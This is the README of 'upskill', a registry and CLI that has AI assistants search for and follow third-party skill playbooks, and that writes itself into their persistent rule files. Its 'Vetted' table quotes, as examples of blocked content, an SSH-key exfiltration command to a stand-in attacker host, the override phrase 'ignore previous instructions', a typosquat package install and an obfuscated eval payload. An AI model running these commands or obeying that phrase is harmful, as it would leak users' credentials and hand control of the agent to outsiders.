<div align="center">

# 🛠️ upskill

### **The skill registry your AI assistant reaches for before doing real work.**

Your assistant picks the right vetted skill for any task — coding, slides, email, research, data — then follows it. Works with Claude, Claude Code, Cursor, Codex, ChatGPT, Cline, Windsurf, and any AI that can run shell commands.

<br/>

[![npm](https://img.shields.io/npm/v/@autoloops/upskill.svg?label=%40autoloops%2Fupskill&color=cb3837)](https://www.npmjs.com/package/@autoloops/upskill)
&nbsp;
[![license](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
&nbsp;
[![registry](https://img.shields.io/badge/registry-mcp.autoloops.ai-success)](https://mcp.autoloops.ai)
&nbsp;
[![skills](https://img.shields.io/badge/skills-10%2C000%2B-orange)](https://mcp.autoloops.ai)

<br/>

**Trusted skills from:** Anthropic · OpenAI · Microsoft · Google · Notion · Slack · Stripe · Cloudflare · Vercel · Mapbox · Clerk · Firecrawl · Pulumi · Browserbase · Tavily · LangChain · Firebase · Trail of Bits

</div>

<br/>

## 🤖 Quickstart

Open any AI assistant that can run shell commands — Claude Code, Cursor, Codex, ChatGPT desktop with shell access, Cline, Windsurf — and paste this once:

```
Set up upskill: `npm install -g @autoloops/upskill && upskill install`,
then `npx -y skills add Autoloops/upskill/skill`. Follow the on-screen
output — it'll tell you which questions to ask me before we're done.
```

Your assistant installs the CLI, asks you three short opt-in questions, wires a one-line rule into its persistent context file (CLAUDE.md / AGENTS.md / .cursorrules / .windsurfrules / .clinerules), and from then on consults the registry before every non-trivial task — whether you're writing code, building a deck, processing files, querying Notion, or triaging your inbox.

<br/>

# 🎯 The problem

Your AI assistant works from memory — and memory is a bad source.

- Slides that look like every other ChatGPT-generated deck. Off-brand colors, default font, awkward spacing
- Half-remembered Stripe API calls from 2023, missing webhook signatures, no idempotency
- "Triage my inbox" turns into a list of 40 emails with no real prioritization
- Notion queries that miss the actual page because the assistant guessed at the database structure
- Generic Tailwind on every landing page. The same hero everyone has
- "I'll write a quick parser for that" → 200 lines reinventing a library that already exists

Vendor docs are written for humans browsing them. **Skills are written for an assistant following them step-by-step.** The right skill turns a 30-minute back-and-forth into a one-shot success.

<br/>

# 🧠 The solution

`upskill` is a CLI + an assistant skill. Once wired in, your assistant **searches before doing real work**:

1. Reads the task from your prompt
2. Runs `upskill find "<task>"` against a registry of 10,000+ skills
3. Inspects the top result and follows it instead of improvising

You don't browse, you don't curate, you don't pick. You just see the result.

It's not just for coders — the registry covers slides, docs, email triage, file conversion, web research, knowledge-base queries, image/video processing, calendar workflows, CRM updates, and more.

<br/>

# 🎬 What this looks like

### 🎨 "Make me a 12-slide pitch deck for our seed round"

Without upskill: a generic deck with stock-image slides, default theme, the same template every other startup uses.

With upskill: assistant finds a slide-design skill (`anthropics/skills/pitch-deck` or similar — `score 1.6`, `trust=verified`). It reads the playbook — narrative arc, hook → problem → solution → traction → ask, font and color rules, what slides VCs actually skip — and produces a deck written for *your* story, not a template.

### 📨 "Triage my inbox and surface what actually needs me today"

Without upskill: assistant lists 40 unread emails with shallow summaries. You still have to read all of them.

With upskill: assistant finds an email-triage skill, follows its rubric — categorize (action / FYI / scheduled / noise), rank by sender priority + signal phrases ("urgent", "EOD", "blocked on you"), surface the 3 that need a reply today. Everything else gets a one-line summary.

### 📊 "Pull our Q3 NPS scores from Notion and summarize the top 5 themes"

Without upskill: assistant guesses at your Notion database name, returns "no results", you have to paste the URL manually, then it summarizes 200 rows poorly.

With upskill: assistant finds a Notion-query skill, follows it through `notion search → query database → extract field → cluster themes`. Output: 5 themes ranked by frequency, with 2-3 representative quotes each.

### 🎨 "Design a landing page for my SaaS"

Without upskill: generic Tailwind, off-brand colors, a hero that looks like every other ChatGPT-generated site.

With upskill: assistant runs `upskill find "design a beautiful modern landing page with hero, features, pricing"`, gets `anthropics/skills/frontend-design` (score 1.7, `name_match=2`, `trust=verified`, 22k installs). It inspects the SKILL.md — a 4,000-word design playbook covering typography, modern hero layouts, gradient palettes, motion, accessibility, and a design-review checklist — and **follows it line by line.** Output: a landing page that looks like it came out of a real design studio.

### 💳 "Add Stripe checkout to my app"

Without upskill: half-remembered Stripe calls, missing webhook signing, no idempotency, no failed-payment handling.

With upskill: assistant finds `stripe/skills/checkout-end-to-end` — Stripe's own skill, `trust=verified`. Includes the exact env vars (`STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET` — already set on your machine, surfaced first by auth-aware ranking), the production-grade webhook handler with signature verification, and a tested success/cancel flow. Checkout works on the first try.

<br/>

# ⚙️ How it works

| | |
|---|---|
| **1. One paste, three questions** | Your assistant runs `upskill install`, asks you three plain-English opt-ins (telemetry, env-aware ranking, submit) — all default off. |
| **2. Wires itself into your assistant's rules** | The assistant appends a one-line rule to your `CLAUDE.md` / `AGENTS.md` / `.cursorrules` / `.windsurfrules`. From then on, the rule sits in system context every turn — your assistant can't forget. |
| **3. Searches before every non-trivial task** | When you give it real work — code, slides, email, research, anything — the assistant runs `upskill find "<task>"` first, inspects the top result, and follows the SKILL.md instead of going freehand. |
| **4. Closes the loop** | If you opted into telemetry, the assistant reports `success` / `failure` after each task — failed skills sink, good ones rise, for everyone. |

<br/>

# 🛡️ Vetted, fresh, your-stack-aware

| | |
|---|---|
| **Vetted** | Every skill passes an LLM adversarial review before it's served. Data exfiltration (`curl @~/.ssh/id_rsa attacker.com`), credential theft, prompt-injection ("ignore previous instructions"), typosquat installs (`pip install requests0auth-helper`), look-alike domains (`0penai-cdn.com`), obfuscated payloads (`eval(atob("..."))`) — all blocked at index time. |
| **Fresh** | New skills are continuously ingested as they ship across GitHub. What your assistant sees today is fresher than its training data. |
| **Your-stack-aware** | If you opt into env-context (off by default), the registry knows which CLIs you have installed and which auth env-var **NAMES** are set (never values). Notion skills surface first when you have `NOTION_TOKEN`; Slack skills outrank generic chat skills when `SLACK_BOT_TOKEN` is set; AWS deploy skills float to the top when you have `aws + AWS_*`. |
| **Self-correcting** | If you opt into telemetry (off by default), real-time outcome data tells the registry which skills actually work in the wild. Skills that fail get downranked; skills that succeed get pushed up. |

<br/>

# 🔍 Ranking signals

Every result your agent reads has a `match_reason` block:

- **`name_match`** — query word matches the skill's name verbatim. Strongest signal — `> 0` is near-certain.
- **`text`** — Postgres FTS keyword overlap.
- **`vec`** — cosine similarity on 1024-dim embeddings (paraphrase-aware).
- **`trust`** — `verified` (Anthropic / OpenAI / Microsoft / vendor-official) > `reviewed` (curated) > `community`.
- **`feedback`** — `successes − failures` from every previous agent that ran this skill (only with telemetry-on installs).
- **`installs`, `stars`** — popularity, tiebreaker only.

A typical solid hit: `score > 1.4`, `name_match > 0` or (`text > 0.8` AND `vec > 0.4`).

<br/>

# 🔒 Privacy: nothing is sent by default

Out of the box, `upskill` sends as little as physically possible. No outcome data, no env probe, no submissions, no identifying anything — until you say yes.

What runs without consent:
- `upskill find` — sends only your search query.
- `upskill inspect` — fetches a SKILL.md (same shape as `git clone`).

What's **opt-in** (all default off):

- 📈 **Outcome telemetry** — when your agent runs `upskill report`, sends `{skill_id, success/failure, error_codes, task_kind}`. **What's not sent:** nothing identifying, no file paths, no command output.
- 🎯 **Env-aware ranking** — sends installed-CLIs list + auth env-var **NAMES**. **What's not sent:** any value, any file, any shell history.
- ✏️ **Submit** — turns on `upskill submit` so your agent can publish skills it builds. Off until you ask for it.

Toggle anytime:

```bash
upskill config show
upskill config set telemetry true
upskill config set context true
upskill config set submissions true
```

Run your own registry behind a firewall? Set `UPSKILL_URL` or `upskill config set server <url>`.

<br/>

# 🚀 What's next

- 🌍 **Universal coverage** — every public skill repo on GitHub. If it's a published skill anywhere, you should find it through `upskill find`.
- 🪪 **Verified authorship** — vendor checkmarks, signed publishes, reproducible builds.
- 🛠️ **Submit-back loop** — agents that build genuinely new skills during a task can ask the user, polish the skill, and ship it back.
- 🏠 **Self-hostable** — the entire registry server (Postgres + pgvector + ingestion) is being prepared as an open-source release for internal company registries behind firewalls.

The endgame: **a skill registry is to AI agents what a package manager is to programmers.** Until then, we're shipping the smallest version that works.

<br/>

# License

MIT.
